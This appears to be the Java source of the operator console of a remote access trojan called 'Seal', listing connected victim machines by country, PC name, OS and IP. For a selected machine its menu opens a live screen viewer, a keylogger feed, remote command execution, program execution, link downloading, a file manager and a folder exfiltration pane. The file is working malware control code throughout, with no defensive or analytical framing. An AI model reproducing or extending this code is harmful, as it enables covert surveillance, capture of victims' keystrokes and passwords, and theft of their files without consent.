package com.fsl.anrftw;
import javax.swing.*;
import java.util.*;
import java.io.*;
import java.awt.*;
import java.awt.event.*;
import java.awt.image.BufferedImage;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketException;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.imageio.ImageIO;
import javax.swing.table.*;

public class Anrftw extends JFrame implements ActionListener,MouseListener,Runnable {
    JPanel pcs=new JPanel();
    JPanel settings=new JPanel();
    JPanel info=new JPanel();
    DefaultTableModel model=new DefaultTableModel();
    boolean started=false;
    JTable all = new JTable(model);
    private Socket res,aRes=null;
    private ServerSocket cServer,RealTime=null;
    private DataInputStream in,aIn=null;
    private DataOutputStream out,aOut=null;
    boolean runKey=true;
    ArrayList<String> ipAd=new ArrayList<>();
    ArrayList<String> pcID=new ArrayList<>();
    Socket slctPc=null;
    boolean stop;
    Runnable showConnections=new Runnable() {
        @Override
        public void run() {
            try{
                while(true){
                    res=cServer.accept();
                    in = new DataInputStream(new BufferedInputStream(res.getInputStream()));
                    out = new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAd.add(line[3]);
                        model.addRow(new Object[]{line[0],line[1],line[2],line[3]+res.getInetAddress().toString(),res.getPort()});
                    }
                }
            }
            catch(Exception e){
                System.out.println("Error in the connection "+e);
            }
        }
    };
    Runnable rdp=new Runnable(){
        @Override
        public void run() {            
            JFrame RdpShow=new JFrame();
            Image finalimg;
            RdpShow.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            RdpShow.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                    try {
                        stop=true;
                        RealTime.close();
                        RealTime=null;
                        RdpShow.dispose();
                    } catch (Exception ex) {}
               }
            });
            RdpShow.setLayout(new FlowLayout(FlowLayout.CENTER));
            RdpShow.setTitle("Seal -- RDP");
            JLabel screen=new JLabel();
            RdpShow.add(screen);
            setPreferredSize(new java.awt.Dimension(1280,720));
            RdpShow.pack();
            RdpShow.setVisible(true);
            try{
                RealTime=new ServerSocket(403);
                RealTime.setReuseAddress(true);
                String ipAddress="";
                out.writeUTF("RDP");
                do{
                    aRes=RealTime.accept();
                    aIn=new DataInputStream(aRes.getInputStream());
                    aOut=new DataOutputStream(aRes.getOutputStream());
                    ipAddress=aIn.readUTF();
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
                int size;
                stop=false;
                while(!(stop)){
                    size=aIn.readInt();
                    byte[] bytes = new byte[1024*1024];
                    int count = 0;
                    do{
                       count+=aIn.read(bytes,count,bytes.length-count);
                    }while(!(count>4 && bytes[count-2]==(byte)-1 && bytes[count-1]==(byte)-39));
                    finalimg = ImageIO.read(new ByteArrayInputStream(bytes));
                    finalimg = finalimg.getScaledInstance(1280,720,Image.SCALE_FAST);
                    aOut.writeInt(size);
                    screen.setIcon(new ImageIcon(finalimg));
                    screen.repaint();
                }
            }
            catch(Exception e){
                System.out.println("ERROR ------\n"+e);
            }
        }
    };
    Runnable keylogger=new Runnable(){
        @Override
        public void run() {
            JFrame keyloggerFrame=new JFrame();
            keyloggerFrame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            keyloggerFrame.addWindowListener(new WindowAdapter() {
                @Override
                public void windowClosing(WindowEvent evt) {
                    try {
                        stop=true;
                        RealTime.close();
                        RealTime=null;
                        keyloggerFrame.dispose();
                    } catch (IOException ex) {System.out.println(ex);}
               }
            });
            keyloggerFrame.setLayout(new FlowLayout(FlowLayout.CENTER));
            keyloggerFrame.setTitle("Seal -- KeyLogger");
            JTextArea keysTyped=new JTextArea(20,40);
            keysTyped.setLineWrap(true);
            keysTyped.setWrapStyleWord(true);
            JScrollPane scroll = new JScrollPane(keysTyped,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            keyloggerFrame.add(scroll);
            keyloggerFrame.pack();
            keyloggerFrame.setVisible(true);
            try{
                RealTime=new ServerSocket(403);
                RealTime.setReuseAddress(true);
                String ipAddress="";
                out.writeUTF("KeyLogger");
                do{
                    aRes=RealTime.accept();
                    aIn=new DataInputStream(aRes.getInputStream());
                    aOut=new DataOutputStream(aRes.getOutputStream());
                    ipAddress=aIn.readUTF();
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
                stop=false;
                while(!(stop)){
                    keysTyped.append(aIn.readUTF());
                    aOut.writeUTF("got it");
                }
            }
            catch(Exception e){
                keysTyped.setText("ERROR ------\n"+e);
            }
        }
    };
    Runnable fileMngr=new Runnable(){
        @Override
        public void run() {
            JFrame fileManager=new JFrame();
            fileManager.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            fileManager.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                    fileManager.dispose();
                }
               });
            fileManager.setLayout(new FlowLayout());
            fileManager.setTitle("Seal -- FileManager");
            DefaultTableModel disksModel=new DefaultTableModel();
            JTable disks=new JTable(disksModel);
            disksModel.addColumn("Disks");
            try {
                out.writeUTF("fileMngr:listdisks");
                String[] listDisks=in.readUTF().split(",");
                for(String cDisk:listDisks){disksModel.addRow(new Object[]{cDisk});}
            } catch (IOException ex) {}
            DefaultTableModel filesModel=new DefaultTableModel();
            JTable files=new JTable(filesModel);
            filesModel.addColumn("Files");
            disks.addMouseListener(new MouseListener(){
                @Override
                public void mouseClicked(MouseEvent e) {}

                @Override
                public void mousePressed(MouseEvent e) {
                    try {
                        int i=0;
                        while(i<filesModel.getRowCount()){filesModel.removeRow(i);}
                        out.writeUTF("fileMngr:"+disksModel.getValueAt(disks.getSelectedRow(),0)+" && cd \""+disksModel.getValueAt(disks.getSelectedRow(),0)+"/\" && dir");
                        String[] filesResponse=(in.readUTF()).split(",");
                        for(String cFile:filesResponse){if(!(cFile.isEmpty())){filesModel.addRow(new Object[]{cFile});}}
                    } catch (IOException ex) {System.out.println(ex);}
                }

                @Override
                public void mouseReleased(MouseEvent e) {}

                @Override
                public void mouseEntered(MouseEvent e) {}

                @Override
                public void mouseExited(MouseEvent e) {}
            });
            files.addMouseListener(new MouseListener(){
                @Override
                public void mouseClicked(MouseEvent e) {}

                @Override
                public void mousePressed(MouseEvent e) {
                   try {
                        int i=0;
                        String[] dir=(files.getValueAt(0,0)).toString().split("Directory of |\t");
                        out.writeUTF("fileMngr:"+disks.getValueAt(disks.getSelectedRow(),0)+"&& cd \""+dir[1]+((files.getValueAt(files.getSelectedRow(), 0).toString().endsWith("\\"))?"":"\\")+files.getValueAt(files.getSelectedRow(), 0)+"\" && dir");
                        while(i<filesModel.getRowCount()){filesModel.removeRow(i);}
                        String[] filesResponse=in.readUTF().split(",");
                        for(String cFile:filesResponse){if(!(cFile.isEmpty())){filesModel.addRow(new Object[]{cFile});}}
                    } catch (IOException ex) {System.out.println("Files error: "+ex);} 
                }

                @Override
                public void mouseReleased(MouseEvent e) {}

                @Override
                public void mouseEntered(MouseEvent e) {}

                @Override
                public void mouseExited(MouseEvent e) {}
                
            });
            disks.setPreferredScrollableViewportSize(new Dimension(50, 70));
            disks.setFillsViewportHeight(true);
            files.setPreferredScrollableViewportSize(new Dimension(500, 70));
            files.setFillsViewportHeight(true);
            JScrollPane DiskScroll = new JScrollPane(disks);
            JScrollPane FilesScroll = new JScrollPane(files);
            fileManager.add(DiskScroll);
            fileManager.add(FilesScroll);
            fileManager.pack();
            fileManager.setVisible(true);
        }
    };
    Runnable cmd=new Runnable(){
        @Override
        public void run() {
            /*try {
                cServer.close();
                cServer=null;
                cServer=new ServerSocket(304);
                cServer.setReuseAddress(true);
                String ipAddress="";
                do{
                    res=cServer.accept();
                    in=new DataInputStream(res.getInputStream());
                    out=new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAddress=line[3];
                    }
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
            } catch (Exception ex) {System.out.println(ex);}*/
            JFrame commandPane=new JFrame();
            commandPane.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            commandPane.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                  commandPane.dispose();
                }
               });
            commandPane.setLayout(new BorderLayout());
            commandPane.setTitle("Seal -- CommandLine");
            JTextField command=new JTextField(40);
            command.setText("Command");
            JTextArea result=new JTextArea(20,40);
            result.setLineWrap(true);
            result.setWrapStyleWord(true);
            result.setText("The results will be shown here");
            JButton send=new JButton("Send");
            send.addActionListener((ActionEvent e) -> {
                try{
                    out.writeUTF("cmd:"+command.getText());
                    result.setText(in.readUTF());
                }catch(Exception except){
                    result.setText("ERROR ------\n"+except);
                }
            });
            JScrollPane scroll = new JScrollPane(result,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            commandPane.add(command,BorderLayout.NORTH);
            commandPane.add(scroll,BorderLayout.CENTER);
            commandPane.add(send,BorderLayout.SOUTH);
            commandPane.pack();
            commandPane.setVisible(true);
        }
    };
    Runnable dwn=new Runnable(){
        @Override
        public void run() {
            /*try {
                cServer.close();
                cServer=null;
                cServer=new ServerSocket(304);
                cServer.setReuseAddress(true);
                String ipAddress="";
                do{
                    res=cServer.accept();
                    in=new DataInputStream(res.getInputStream());
                    out=new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAddress=line[3];
                    }
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
            } catch (Exception ex) {System.out.println(ex);}*/
            JFrame downloadPane=new JFrame();
            downloadPane.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            downloadPane.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                  downloadPane.dispose();
                }
               });
            downloadPane.setLayout(new BorderLayout());
            downloadPane.setTitle("Seal -- Download");
            JTextArea links=new JTextArea(20,40);
            links.setLineWrap(true);
            links.setWrapStyleWord(true);
            links.setText("Paste here the links(1 per line)");
            JButton send=new JButton("Send");
            send.addActionListener((ActionEvent e) -> {
                try{
                    out.writeUTF("links:"+links.getText());
                    links.setText(in.readUTF());
                }catch(Exception except){
                    links.setText("ERROR ------\n"+except);
                }
            });
            JScrollPane scroll = new JScrollPane(links,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            downloadPane.add(scroll,BorderLayout.CENTER);
            downloadPane.add(send,BorderLayout.SOUTH);
            downloadPane.pack();
            downloadPane.setVisible(true);
        }
    };
    Runnable exe=new Runnable(){
        @Override
        public void run() {
            /*try {
                cServer.close();
                cServer=null;
                cServer=new ServerSocket(304);
                cServer.setReuseAddress(true);
                String ipAddress="";
                do{
                    res=cServer.accept();
                    in=new DataInputStream(res.getInputStream());
                    out=new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAddress=line[3];
                    }
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
            } catch (Exception ex) {System.out.println(ex);}*/
            JFrame execute=new JFrame();
            execute.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            execute.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                  execute.setVisible(false);
                }
               });
            execute.setLayout(new BorderLayout());
            execute.setTitle("Seal -- Execute");
            JTextArea apps=new JTextArea(20,40);
            apps.setLineWrap(true);
            apps.setWrapStyleWord(true);
            apps.setText("Enter the path to the programs you want to run(One per line): ");
            apps.addMouseListener(new MouseAdapter(){
                public void mouseClicked(ActionEvent e){
                    apps.setText("");
                }
            });
            JButton send=new JButton("Send");
            send.addActionListener((ActionEvent e) -> {
                try{
                    out.writeUTF("exe:"+apps.getText());
                    apps.setText(in.readUTF());
                }catch(Exception except){
                    apps.setText("ERROR ------\n"+except);
                }
            });
            JScrollPane scroll = new JScrollPane(apps,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            execute.add(scroll,BorderLayout.CENTER);
            execute.add(send,BorderLayout.SOUTH);
            execute.pack();
            execute.setVisible(true);
        }
    };
    Runnable zip=new Runnable(){
        @Override
        public void run() {
            /*try {
                cServer.close();
                cServer=null;
                cServer=new ServerSocket(304);
                cServer.setReuseAddress(true);
                String ipAddress="";
                do{
                    res=cServer.accept();
                    in=new DataInputStream(res.getInputStream());
                    out=new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAddress=line[3];
                    }
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
            } catch (Exception ex) {System.out.println(ex);}*/
            JFrame zipPane=new JFrame();
            zipPane.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            zipPane.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                  zipPane.setVisible(false);
                }
               });
            zipPane.setLayout(new BorderLayout());
            zipPane.setTitle("Seal -- Zip");
            JTextArea path=new JTextArea(20,40);
            path.setLineWrap(true);
            path.setWrapStyleWord(true);
            path.setText("Enter the path to the programs you want to zip(One per line)");
            JButton send=new JButton("Send");
            send.addActionListener((ActionEvent e) -> {
                try{
                    int i=0;
                    String[] files=path.getText().split("\n");
                    String result="";
                    while(i<files.length){
                        out.writeUTF("zip:"+files[i].replace("'", "''"));
                        result=result.concat(in.readUTF());
                        i++;
                    }
                    path.setText(result);
                }catch(Exception except){
                    path.setText("ERROR ------\n"+except);
                }
            });
            JScrollPane scroll = new JScrollPane(path,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            zipPane.add(scroll,BorderLayout.CENTER);
            zipPane.add(send,BorderLayout.SOUTH);
            zipPane.pack();
            zipPane.setVisible(true);
        }
    };
    Runnable downF=new Runnable(){
        @Override
        public void run() {
            /*try {
                cServer.close();
                cServer=null;
                cServer=new ServerSocket(304);
                cServer.setReuseAddress(true);
                String ipAddress="";
                do{
                    res=cServer.accept();
                    in=new DataInputStream(res.getInputStream());
                    out=new DataOutputStream(res.getOutputStream());
                    String response=in.readUTF();
                    if(response.contains(",")){
                        System.out.println("Connection with client "+res.getInetAddress());
                        String[] line = (response).split(",");
                        ipAddress=line[3];
                    }
                }
                while(!(ipAd.get(all.getSelectedRow()).equals(ipAddress)));
            } catch (Exception ex) {System.out.println(ex);}*/
            JFrame downFFrame=new JFrame();
            downFFrame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
            downFFrame.addWindowListener(new WindowAdapter() {
                public void windowClosing(WindowEvent evt) {
                  downFFrame.setVisible(false);
                }
               });
            downFFrame.setLayout(new BorderLayout());
            downFFrame.setTitle("Seal -- Download Folders");
            JTextArea path=new JTextArea(20,40);
            path.setLineWrap(true);
            path.setWrapStyleWord(true);
            path.setText("Enter the path to the folders you want to download(The files are downloaded in C:\\Users\\"+System.getProperty("user.name")+"): ");
            JButton send=new JButton("Send");
            send.addActionListener((ActionEvent e) -> {
                String[] folders=path.getText().split("\n");
                String result="";
                int i=0;
                while(i<folders.length){
                    try{
                        out.writeUTF("downF:"+folders[i]);
                        String[] file=folders[i].split("\\\\");
                        FileOutputStream writeFile = new FileOutputStream("C:\\Users\\"+System.getProperty("user.name")+"\\"+(file[file.length-1]));

                        int count;
                        byte[] buffer = new byte[8192]; // or 4096, or more
                        do{
                            count = in.read(buffer);
                            writeFile.write(buffer, 0, count);
                        }while (count>=8192);
                        writeFile.close();
                        result=result.concat(in.readUTF()+" in C:\\Users\\"+System.getProperty("user.name")+"\n");
                    }catch(Exception except){
                        result=result.concat("ERROR ------\n"+except);
                    }
                    i++;
                }
                path.setText(result);
            });
            JScrollPane scroll = new JScrollPane(path,JScrollPane.VERTICAL_SCROLLBAR_AS_NEEDED,JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
            downFFrame.add(scroll,BorderLayout.CENTER);
            downFFrame.add(send,BorderLayout.SOUTH);
            downFFrame.pack();
            downFFrame.setVisible(true);
        }
    };
    public Anrftw() {
        model.addColumn("Country");
        model.addColumn("PC Name");
        model.addColumn("OS");
        model.addColumn("IP");
        model.addColumn("Port");
        try {
            cServer=new ServerSocket(304);
            cServer.setReuseAddress(true);
        } catch (IOException ex) {System.out.println(ex);}
        new Thread(showConnections).start();
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        FlowLayout ly=new FlowLayout(FlowLayout.CENTER);
        setTitle("Seal -- Admin Interface");
        setLayout(ly);
        all.setPreferredScrollableViewportSize(new Dimension(500, 70));
        all.setFillsViewportHeight(true);
        all.addMouseListener(this);
        JScrollPane scroll = new JScrollPane(all);
        add(scroll);
        pack();
        setVisible(true);
        /*
        try {
            cServer=new ServerSocket(304);
            cServer.setReuseAddress(true);
            res=cServer.accept();
            in = new DataInputStream(new BufferedInputStream(res.getInputStream()));
            out = new DataOutputStream(res.getOutputStream());
            String response=in.readUTF();
            if(response.contains(",")){
                System.out.println("Connection with client "+res.getInetAddress());
                String[] line = (response).split(",");
                model.addRow(new Object[]{line[0],line[1],line[2],line[3]+res.getInetAddress().toString(),res.getPort()});
            }
        } catch (IOException ex) {System.out.println(ex);}*/
    }
    public static void main(String[] args){
        new Anrftw();
    }
    @Override
    public void actionPerformed(ActionEvent e) {
        String command=e.getActionCommand();
        switch(command){
            case "RDP" -> {
                new Thread(rdp).start();
                break;
            }
            case "KeyLogger" -> {
                new Thread(keylogger).start();
                break;
            }
            case "Execute commands" -> {
                new Thread(cmd).start();
                break;
            }
            case "Download" -> {
                new Thread(dwn).start();
                break;
            }
            case "Zip Folders" -> {
                new Thread(zip).start();
                break;
            }
            case "Download folders from the pc" -> {
                new Thread(downF).start();
                break;
            }
            case "File manager" -> {
                new Thread(fileMngr).start();
                break;
            }
            default ->{
                new Thread(exe).start();
            }
        }
    }
    @Override
    public void mouseClicked(MouseEvent e) {
        pcID.add(all.getModel().getValueAt(all.getSelectedRow(), 1).toString());
        JMenuBar options = new JMenuBar();
        JMenu ask = new JMenu("What do you want to do?");
        JMenuItem rdp = new JMenuItem("RDP");
        JMenuItem key = new JMenuItem("KeyLogger");
        JMenuItem cmd = new JMenuItem("Execute commands");
        JMenuItem dwn = new JMenuItem("Download");
        JMenuItem exe = new JMenuItem("Execute Programs");
        JMenuItem zip = new JMenuItem("Zip Folders");
        JMenuItem downF = new JMenuItem("Download folders from the pc");
        JMenuItem fileMn = new JMenuItem("File manager");
        rdp.addActionListener(this);
        key.addActionListener(this);
        cmd.addActionListener(this);
        dwn.addActionListener(this);
        exe.addActionListener(this);
        zip.addActionListener(this);
        downF.addActionListener(this);
        fileMn.addActionListener(this);
        ask.add(rdp);
        ask.add(key);
        ask.add(cmd);
        ask.add(dwn);
        ask.add(exe);
        ask.add(zip);
        ask.add(downF);
        ask.add(fileMn);
        options.add(ask);
        JOptionPane.showMessageDialog(null,options);
    }

    @Override
    public void mousePressed(MouseEvent e) {
        
    }

    @Override
    public void mouseReleased(MouseEvent e) {
        
    }

    @Override
    public void mouseEntered(MouseEvent e) {
        
    }

    @Override
    public void mouseExited(MouseEvent e) {
        
    }

    @Override
    public void run() {
        
    }
}